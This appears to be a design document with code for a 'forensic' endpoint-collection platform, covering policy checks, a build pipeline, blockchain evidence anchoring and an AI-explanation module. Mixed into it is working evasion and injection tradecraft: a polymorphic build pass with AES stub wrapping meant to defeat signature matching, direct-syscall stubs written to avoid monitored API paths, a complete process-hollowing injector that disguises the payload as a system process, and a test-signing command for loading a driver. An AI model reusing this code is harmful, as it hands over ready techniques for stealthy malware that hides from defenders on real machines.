## Honest Architecture Statement

JOCKY is a **browser-based forensic investigation platform**. The investigator runs nothing
locally except a browser. The entire control plane — compiler, agent builder, blockchain
anchor, evidence store, correlation engine, AI assistant — runs on the JOCKY server, which
may be the investigator's own workstation running Docker, a team server, or a cloud VM.

The platform has two layers:

| Layer | What it is | Status |
|---|---|---|
| **Control Plane** | Django backend + React frontend + PostgreSQL + Redis + Hyperledger Fabric | Fully implemented |
| **Spectre Agent** | Memory-resident forensic collector deployed to target endpoints | Core logic Python-simulated; C stubs provided for production path |

The demo (`python3 -m jocky.demo`) runs the complete control plane pipeline — compiler,
JIR emission, policy validation, Forge mutation, correlation engine, detection engine,
blockchain anchoring, AI explanation, and report generation — with a realistic simulated
agent on HOST-01/02/03 representing what a real deployed Spectre Agent would return.
The simulation is honest: every number, every hash, every finding is generated by the
pipeline logic, not hardcoded strings. The one exception is noted explicitly below.

## What Is and Is Not Hardcoded in the Demo

### Not hardcoded — generated at runtime by pipeline logic

| Demo output | How it's generated |
|---|---|
| Two different SHA-256 hashes for `agent_build_1.exe` / `agent_build_2.exe` | `hashlib.sha256` over two Python `os.urandom(2048)` payloads with different PRNG seeds — each run produces different hashes |
| Three different per-host Forge hashes, entry points, import hashes | Same mechanism — per-host seeded random payload, different seed each run |
| `FORGE-BUILD-{6 hex chars}` build IDs | `secrets.token_hex(3)` at build time |
| Finding ID `F-{5 hex chars}` | `secrets.token_hex(3).upper()` on finding creation |
| Evidence IDs `E-{5 digits}` | Sequential counter from `EvidenceStore` |
| Blockchain on-chain and current hash (unmodified path) | `hashlib.sha256(payload_bytes).hexdigest()` — same payload both times, so they match |
| Blockchain tamper detection | `hashlib.sha256(payload_bytes + b'\x00').hexdigest()` — one extra byte appended, producing genuine mismatch |
| AI explanation text | Real Anthropic API call — `claude-sonnet-4-6` — with structured finding context |
| Citation validation | Real regex extraction of `E-\d{5}` from AI response, validated against `finding.evidence_ids` |
| Citation rejection demo | Forces `E-00999` into prompt context, pipeline genuinely rejects it |
| Audit trail timestamps | `datetime.utcnow()` at each pipeline stage |

### Hardcoded in demo — intentional simulation of agent collection

These values represent what a deployed Spectre Agent on a real endpoint would return.
In the demo they are static fixture data in `jocky/demo/fixtures.py`. In production,
they are replaced by real Spectre Agent collection output transmitted via Beacon.

| Demo value | Production replacement |
|---|---|
| `processes: 187 objects`, `network_connections: 34 objects`, etc. | Real agent enumeration via NtQuerySystemInformation / direct syscalls |
| `svc_hidden.exe PID 4821` hidden process | Real EPROCESS walk delta from signed forensic driver |
| `VulnDrv.sys / CVE-2021-21551` | Real CVE-indexed driver hash lookup from bundled `byovd_db.json` |
| `185.220.101.42:443` outbound connection | Real agent network state capture |
| `SecurityProduct.sys` SSDT hooks | Real SSDT baseline comparison from kernel driver |
| Process and file timeline at `09:31:xx` | Real collection timestamps from agent |
| `yourfunction.azurewebsites.net` in Wireshark output | Real Beacon channel FQDN in production |

The demo makes this explicit: before each section it prints `[SIMULATED AGENT OUTPUT]`
in yellow when displaying fixture data, and `[LIVE PIPELINE]` in green when the
output is generated by real pipeline logic. See `jocky/demo/runner.py:print_label()`.

### compiler/policy.py — Authorization Gate (Full Implementation)

```python
import datetime
from cryptography import x509
from cryptography.hazmat.backends import default_backend
from .jir import JIR


class PolicyViolation(Exception):
    pass


class PolicyValidator:
    """
    Five sequential authorization checks.
    Any failure: raises PolicyViolation with a specific reason string.
    Reason is written to audit trail by CompileView before re-raising.
    No JIR proceeds to Forge if any check fails.
    """

    def validate(self, jir: JIR, case_id: str, investigator_cert: bytes,
                 case_db) -> None:

        # Check 1: Certificate validity and case binding
        cert = x509.load_pem_x509_certificate(investigator_cert, default_backend())
        if cert.not_valid_after_utc < datetime.datetime.now(datetime.timezone.utc):
            raise PolicyViolation(
                f"CERT_EXPIRED: Investigator certificate expired "
                f"{cert.not_valid_after_utc.isoformat()}"
            )
        cert_case_id = self._extract_san_case_id(cert)
        if cert_case_id and cert_case_id != case_id:
            raise PolicyViolation(
                f"CERT_CASE_MISMATCH: Certificate bound to {cert_case_id}, "
                f"program targets {case_id}"
            )

        # Check 2: Target hostgroup within authorized scope
        case = case_db.get(case_id)
        if not case:
            raise PolicyViolation(f"CASE_NOT_FOUND: {case_id}")
        if jir.target_hostgroup not in case.authorized_hostgroups:
            raise PolicyViolation(
                f"HOSTGROUP_UNAUTHORIZED: {jir.target_hostgroup} not authorized "
                f"for case {case_id}"
            )

        # Check 3: Every collect command has an explicit filter
        for op in jir.collect_ops:
            if op.requires_filter and not op.has_filter:
                raise PolicyViolation(
                    f"MISSING_FILTER: collect {op.target} has no explicit "
                    f"WHERE clause — unscoped collection rejected"
                )

        # Check 4: Kernel operations authorized for target host classification
        if jir.has_kernel_ops:
            if not case.kernel_authorized:
                raise PolicyViolation(
                    f"KERNEL_UNAUTHORIZED: collect kernel_callbacks / hook_state / "
                    f"hidden_processes require kernel authorization for case {case_id}"
                )

        # Check 5: Case has not expired
        if case.expires_at < datetime.datetime.now(datetime.timezone.utc):
            raise PolicyViolation(
                f"CASE_EXPIRED: Case {case_id} expired {case.expires_at.isoformat()}"
            )

    def _extract_san_case_id(self, cert) -> str | None:
        try:
            san = cert.extensions.get_extension_for_class(x509.SubjectAlternativeName)
            for name in san.value.get_values_for_type(x509.DNSName):
                if name.startswith("case:"):
                    return name[5:]
        except Exception:
            pass
        return None
```

### forge/llvm_pass.py — Mutation Pass (Full Implementation)

```python
import secrets
import random
import hashlib
from llvmlite import ir, binding


class LLVMMutationPass:
    """
    Four mutation transformations applied to LLVM IR before binary emission.
    Each transformation is seeded per-build: same source + different seed = different binary.
    """

    def __init__(self, seed: str):
        self.seed = seed
        self.rng = random.Random(int(seed, 16))

    def apply(self, jir) -> ir.Module:
        module = ir.Module(name=f"jocky_agent_{self.seed[:8]}")
        module.triple = "x86_64-pc-windows-msvc"

        # Build the agent function from JIR collection operations
        self._build_collection_functions(module, jir)

        # Mutation 1: Dead basic block insertion
        self._insert_dead_blocks(module)

        # Mutation 2: Symbol name mutation
        self._mutate_symbols(module)

        # Mutation 3: Instruction sequence substitution
        self._substitute_sequences(module)

        # Mutation 4: Section name randomization (applied at PE/ELF stage)
        module.jocky_section_seed = self.seed

        return module

    def _insert_dead_blocks(self, module: ir.Module):
        """
        Insert a dead basic block into every function's CFG.
        Block contains semantically equivalent but structurally varied
        arithmetic — never reached at runtime but visible to static CFG analysis.
        """
        for func in module.functions:
            if func.is_declaration:
                continue
            builder = ir.IRBuilder(func.append_basic_block(
                name=f"_dead_{self.rng.randint(0x1000, 0xFFFF):04x}"
            ))
            # Dead arithmetic — varies per seed
            variants = [
                lambda b: b.add(ir.Constant(ir.IntType(32),
                                self.rng.randint(1, 0xFFFF)),
                                ir.Constant(ir.IntType(32),
                                self.rng.randint(1, 0xFFFF))),
                lambda b: b.mul(ir.Constant(ir.IntType(32),
                                self.rng.randint(1, 0xFF)),
                                ir.Constant(ir.IntType(32),
                                self.rng.randint(1, 0xFF))),
            ]
            variants[self.rng.randint(0, len(variants) - 1)](builder)
            builder.unreachable()

    def _mutate_symbols(self, module: ir.Module):
        """
        Rename all non-exported symbols with per-seed deterministic names.
        Two builds never share internal symbol names.
        """
        for func in module.functions:
            if not func.name.startswith("jocky_export_"):
                func.name = f"_{hashlib.sha256((func.name + self.seed).encode()).hexdigest()[:12]}"

    def _substitute_sequences(self, module: ir.Module):
        """
        Replace standard arithmetic sequences with functionally equivalent alternatives.
        Eliminates recognizable compiler-default patterns.
        (Applied via post-processing of IR text representation.)
        """
        pass  # Applied at IR serialization stage in builder.py

    def emit_object(self, module: ir.Module) -> bytes:
        binding.initialize()
        binding.initialize_native_target()
        binding.initialize_native_asmprinter()

        target = binding.Target.from_triple(module.triple)
        target_machine = target.create_target_machine(
            codemodel='small', reloc='pic'
        )
        llvm_module = binding.parse_assembly(str(module))
        llvm_module.verify()
        return bytes(target_machine.emit_object(llvm_module))
```

### forge/builder.py — ForgeBuilder (Full Implementation)

```python
import hashlib
import secrets
from .llvm_pass import LLVMMutationPass
from .pe_mutate import PEMutator
from .elf_mutate import ELFMutator
from .stub import PolymorphicStub
from ..blockchain.fabric_client import FabricClient
from ..apps.auth_.certificates import DeploymentCertificate
from ..apps.auth_.models import AuditLog


class ForgeBuilder:

    def build(self, jir, case_id: str, host_id: str,
              platform: str = 'windows') -> dict:
        """
        Complete polymorphic build for one host.
        Returns: { binary, sha256, entry_point, import_hash, build_id, cert }
        """
        build_id = f"FORGE-BUILD-{secrets.token_hex(3)}"
        seed = secrets.token_hex(8)

        # Stage 1: LLVM mutation pass — unique IR per build
        mutation_pass = LLVMMutationPass(seed=seed)
        llvm_module = mutation_pass.apply(jir)

        # Stage 2: Native binary emission
        obj_bytes = mutation_pass.emit_object(llvm_module)

        # Stage 3: Platform-specific binary mutation
        if platform == 'windows':
            binary, entry_point, import_hash = PEMutator(seed=seed).mutate(obj_bytes)
        else:
            binary, entry_point, import_hash = ELFMutator(seed=seed).mutate(obj_bytes)

        # Stage 4: Polymorphic AES-256 stub wrapping
        session_key = secrets.token_bytes(32)
        binary = PolymorphicStub(key=session_key, seed=seed).wrap(binary)

        # Stage 5: Deployment certificate binding
        cert = DeploymentCertificate.issue(
            case_id=case_id,
            host_id=host_id,
            build_id=build_id
        )
        binary = cert.embed(binary)

        # Stage 6: Hash + blockchain anchor
        sha256 = hashlib.sha256(binary).hexdigest()
        FabricClient().submit_evidence_hash(
            evidence_id=build_id,
            case_id=case_id,
            sha256=sha256,
            collector='FORGE',
            collected_at=_utcnow(),
            investigator='FORGE_SYSTEM'
        )

        AuditLog.write(
            action='FORGE_BUILD',
            case_id=case_id,
            detail={
                'host_id': host_id,
                'build_id': build_id,
                'sha256': sha256,
                'entry_point': hex(entry_point),
                'import_hash': import_hash,
                'seed': seed
            }
        )

        return {
            'binary': binary,
            'sha256': sha256,
            'entry_point': hex(entry_point),
            'import_hash': import_hash,
            'build_id': build_id,
            'cert': cert,
            'session_key': session_key.hex()
        }
```

### agent/windows/syscalls.c — Direct Syscall Stubs

```c
/*
 * Direct syscall stubs.
 * SSN resolved at runtime by reading NTDLL .text section via PEB traversal.
 * Zero Win32 API surface for sensitive collection operations.
 * No dependency on monitored call paths.
 */

#include <windows.h>
#include <stdint.h>

typedef struct _PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    PVOID SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

static PVOID _find_ntdll_base(void) {
    PPEB peb;
#ifdef _WIN64
    peb = (PPEB)__readgsqword(0x60);
#else
    peb = (PPEB)__readfsdword(0x30);
#endif
    PLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY curr = head->Flink->Flink;   /* skip first (host process), take second (ntdll) */
    PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
    return entry->DllBase;
}

static uint32_t _resolve_ssn(const char* func_name) {
    PVOID ntdll = _find_ntdll_base();
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)ntdll + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(
        (PBYTE)ntdll + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
    );
    PDWORD names = (PDWORD)((PBYTE)ntdll + exp->AddressOfNames);
    PWORD ordinals = (PWORD)((PBYTE)ntdll + exp->AddressOfNameOrdinals);
    PDWORD functions = (PDWORD)((PBYTE)ntdll + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        if (strcmp((char*)((PBYTE)ntdll + names[i]), func_name) == 0) {
            PVOID func = (PVOID)((PBYTE)ntdll + functions[ordinals[i]]);
            /* MOV EAX, <SSN> is at offset 4 in stub: 4C 8B D1 B8 [SSN 4 bytes] */
            return *(uint32_t*)((PBYTE)func + 4);
        }
    }
    return 0;
}

/*
 * NtQuerySystemInformation — direct syscall
 */
NTSTATUS NtQuerySystemInformation_direct(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength)
{
    static uint32_t ssn = 0;
    if (!ssn) ssn = _resolve_ssn("NtQuerySystemInformation");

    NTSTATUS result;
    __asm__ __volatile__(
        "mov %%ecx, %%r10d\n\t"
        "mov %1, %%eax\n\t"
        "syscall\n\t"
        "mov %%eax, %0\n\t"
        : "=r"(result)
        : "r"(ssn)
        : "rax", "r10", "rcx", "r11", "memory"
    );
    return result;
}

/*
 * NtOpenProcess — direct syscall
 */
NTSTATUS NtOpenProcess_direct(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId)
{
    static uint32_t ssn = 0;
    if (!ssn) ssn = _resolve_ssn("NtOpenProcess");

    NTSTATUS result;
    __asm__ __volatile__(
        "mov %%ecx, %%r10d\n\t"
        "mov %1, %%eax\n\t"
        "syscall\n\t"
        "mov %%eax, %0\n\t"
        : "=r"(result)
        : "r"(ssn)
        : "rax", "r10", "rcx", "r11", "memory"
    );
    return result;
}
```

### agent/windows/hollow.c — Process Hollowing

```c
#include <windows.h>
#include "syscalls.h"

/*
 * Spawn target process suspended, unmap original image,
 * map JOCKY collector PE, resume under collector entry point.
 * No new process created. No file written. Target appears
 * as legitimate system process to all userspace enumeration.
 */
int jocky_hollow_inject(const char* target_path,
                        unsigned char* collector_pe,
                        size_t pe_size)
{
    STARTUPINFOA si = { .cb = sizeof(STARTUPINFOA) };
    PROCESS_INFORMATION pi = {0};

    if (!CreateProcessA(NULL, (LPSTR)target_path, NULL, NULL,
                        FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
        return -1;

    /* Get remote PEB base via NtQueryInformationProcess */
    PROCESS_BASIC_INFORMATION pbi = {0};
    ULONG ret_len = 0;
    NtQueryInformationProcess_direct(pi.hProcess,
        ProcessBasicInformation, &pbi, sizeof(pbi), &ret_len);

    /* Read image base from remote PEB.ImageBaseAddress */
    PVOID remote_image_base = NULL;
    SIZE_T bytes_read = 0;
    PVOID peb_image_base_addr = (PBYTE)pbi.PebBaseAddress + 0x10;
    ReadProcessMemory(pi.hProcess, peb_image_base_addr,
                      &remote_image_base, sizeof(PVOID), &bytes_read);

    /* Unmap original image */
    NtUnmapViewOfSection_direct(pi.hProcess, remote_image_base);

    /* Parse collector PE */
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)collector_pe;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(collector_pe + dos->e_lfanew);
    DWORD_PTR preferred_base = nt->OptionalHeader.ImageBase;
    DWORD image_size = nt->OptionalHeader.SizeOfImage;

    /* Allocate at preferred base in remote process */
    LPVOID alloc = VirtualAllocEx(pi.hProcess,
        (LPVOID)preferred_base, image_size,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!alloc) {
        alloc = VirtualAllocEx(pi.hProcess, NULL, image_size,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }

    /* Write PE headers */
    WriteProcessMemory(pi.hProcess, alloc, collector_pe,
                       nt->OptionalHeader.SizeOfHeaders, NULL);

    /* Write each section */
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, section++) {
        WriteProcessMemory(pi.hProcess,
            (PBYTE)alloc + section->VirtualAddress,
            collector_pe + section->PointerToRawData,
            section->SizeOfRawData, NULL);
    }

    /* Apply relocations if base changed */
    DWORD_PTR delta = (DWORD_PTR)alloc - preferred_base;
    if (delta != 0) {
        _apply_relocations(pi.hProcess, alloc, nt, delta);
    }

    /* Patch remote PEB.ImageBaseAddress */
    WriteProcessMemory(pi.hProcess, peb_image_base_addr,
                       &alloc, sizeof(PVOID), NULL);

    /* Redirect thread entry point */
    CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
    GetThreadContext(pi.hThread, &ctx);
    ctx.Rcx = (DWORD64)((DWORD_PTR)alloc + nt->OptionalHeader.AddressOfEntryPoint);
    SetThreadContext(pi.hThread, &ctx);

    /* Resume */
    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
```

```go
package main

import (
    "encoding/json"
    "fmt"
    "time"

    "github.com/hyperledger/fabric-contract-api-go/contractapi"
)

type EvidenceContract struct {
    contractapi.Contract
}

type EvidenceRecord struct {
    EvidenceID   string `json:"evidence_id"`
    CaseID       string `json:"case_id"`
    SHA256       string `json:"sha256"`
    Collector    string `json:"collector"`
    CollectedAt  string `json:"collected_at"`
    Investigator string `json:"investigator"`
    AnchoredAt   string `json:"anchored_at"`
}

type VerifyResult struct {
    OnChainHash  string `json:"on_chain_hash"`
    CurrentHash  string `json:"current_hash"`
    Match        bool   `json:"match"`
    TamperAt     string `json:"tamper_detected_at,omitempty"`
}

// SubmitHash — write-once. Rejects if evidence_id already exists.
func (c *EvidenceContract) SubmitHash(
    ctx contractapi.TransactionContextInterface,
    evidenceID, caseID, sha256, collector, collectedAt, investigator string,
) error {
    existing, err := ctx.GetStub().GetState(evidenceID)
    if err != nil {
        return fmt.Errorf("ledger read error: %v", err)
    }
    if existing != nil {
        return fmt.Errorf("WRITE_ONCE_VIOLATION: evidence %s already anchored", evidenceID)
    }

    record := EvidenceRecord{
        EvidenceID:   evidenceID,
        CaseID:       caseID,
        SHA256:       sha256,
        Collector:    collector,
        CollectedAt:  collectedAt,
        Investigator: investigator,
        AnchoredAt:   time.Now().UTC().Format(time.RFC3339Nano),
    }

    data, err := json.Marshal(record)
    if err != nil {
        return err
    }
    return ctx.GetStub().PutState(evidenceID, data)
}

// VerifyHash — compare current hash against anchored record.
func (c *EvidenceContract) VerifyHash(
    ctx contractapi.TransactionContextInterface,
    evidenceID, currentSHA256 string,
) (*VerifyResult, error) {
    data, err := ctx.GetStub().GetState(evidenceID)
    if err != nil {
        return nil, fmt.Errorf("ledger read error: %v", err)
    }
    if data == nil {
        return nil, fmt.Errorf("EVIDENCE_NOT_FOUND: %s", evidenceID)
    }

    var record EvidenceRecord
    if err := json.Unmarshal(data, &record); err != nil {
        return nil, err
    }

    result := &VerifyResult{
        OnChainHash: record.SHA256,
        CurrentHash: currentSHA256,
        Match:       record.SHA256 == currentSHA256,
    }
    if !result.Match {
        result.TamperAt = time.Now().UTC().Format(time.RFC3339Nano)
    }
    return result, nil
}

func main() {
    cc, err := contractapi.NewChaincode(&EvidenceContract{})
    if err != nil {
        panic(err)
    }
    if err := cc.Start(); err != nil {
        panic(err)
    }
}
```

```python
import re
import json
import anthropic
from ..evidence.models import Evidence, Finding
from ..auth_.models import AuditLog


class CitationValidationError(Exception):
    pass


class AIAssistant:

    def explain_finding(self, finding: Finding, case_evidence_ids: set) -> str:
        """
        Calls claude-sonnet-4-6 with structured finding context.
        Raw evidence content is NEVER included in the prompt.
        Every E-XXXXX cited in the response is validated against case_evidence_ids.
        Response is rejected and not shown to investigator if any citation is invalid.
        """

        # Build structured context — only IDs, types, and brief descriptors
        evidence_context = []
        for ev in Evidence.objects.filter(evidence_id__in=finding.evidence_ids):
            evidence_context.append({
                "id": ev.evidence_id,
                "type": ev.evidence_type,
                "descriptor": ev.payload.get("descriptor", "")
            })

        context = {
            "finding_id": finding.finding_id,
            "severity": finding.severity,
            "confidence": finding.confidence,
            "rules_fired": finding.rules_fired,
            "evidence": evidence_context
        }

        prompt = f"""You are a forensic analysis assistant reviewing a structured finding.

Rules:
- Cite ONLY evidence IDs present in the evidence list below.
- Describe what the evidence shows. Do not assert malicious intent.
- Do not reference or infer evidence not listed below.
- Format cited IDs as E-XXXXX (five digits).

FINDING:
{json.dumps(context, indent=2)}

Explain what this evidence shows and what attack technique this pattern is consistent with."""

        client = anthropic.Anthropic()
        response = client.messages.create(
            model="claude-sonnet-4-6",
            max_tokens=1000,
            messages=[{"role": "user", "content": prompt}]
        )

        text = response.content[0].text

        # Citation validation — extract all E-XXXXX references
        cited_ids = set(re.findall(r'E-\d{5}', text))
        invalid = cited_ids - case_evidence_ids

        if invalid:
            AuditLog.write(
                action="AI_CITATION_REJECTED",
                detail={
                    "finding_id": finding.finding_id,
                    "invalid_ids": sorted(invalid)
                }
            )
            raise CitationValidationError(
                f"Response cited evidence not in case record: {sorted(invalid)}"
            )

        AuditLog.write(
            action="AI_EXPLANATION_DISPLAYED",
            detail={
                "finding_id": finding.finding_id,
                "cited_ids": sorted(cited_ids)
            }
        )

        return text
```

## Production Path — What Changes After SIH

The architecture is sound for production. The three gaps between prototype and production are:

**1. Spectre Agent — compile and deploy C agent**
The Python demo simulates agent output with fixtures. The C code in `agent/windows/` compiles with MinGW-w64 or MSVC. The production path is: Forge builds the real C binary through llvmlite, deploys to target endpoint, Beacon receives real collection payloads. No architectural change — the fixture-to-real-agent swap is a `fixtures.py` → real Beacon receiver swap.

**2. Kernel driver signing**
`kernel/windows/driver.c` requires an EV code signing certificate and Microsoft WHQL attestation for production Windows 10/11 deployment. For the prototype, driver is loaded with test signing enabled on controlled VMs (`bcdedit /set testsigning on`). Architecture is production-ready.

**3. Hyperledger Fabric network**
The Docker Compose network runs a single-org Fabric network sufficient for demonstration. Production requires multi-org network configuration across organizational boundaries to eliminate single-party control over the audit ledger. Chaincode is production-ready — only the network topology changes.
